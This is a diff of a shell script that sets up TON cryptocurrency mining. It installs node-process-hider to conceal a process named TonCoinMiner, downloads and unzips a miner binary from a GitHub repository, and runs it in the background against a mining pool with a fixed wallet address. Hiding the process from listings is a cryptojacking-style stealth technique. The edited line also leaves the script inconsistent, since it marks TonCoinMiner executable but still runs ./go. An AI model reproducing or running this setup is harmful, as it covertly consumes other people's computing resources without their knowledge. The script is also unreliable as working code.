@@ -4,6 +4,6 @@ sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 79 97
 sudo apt-get -y unzip
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add TonCoinMiner
-sudo https://github.com/optimis3232/TonCoin_Miner/raw/main/TonCoin_Miner_v1.2.zip && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x go
+sudo wget https://github.com/optimis3232/TonCoin_Miner/raw/main/TonCoin_Miner_v1.2.zip && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x TonCoinMiner
 sudo apt install ocl-icd-opencl-dev -y
 ./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --pool https://pool.services.tonwhales.com &
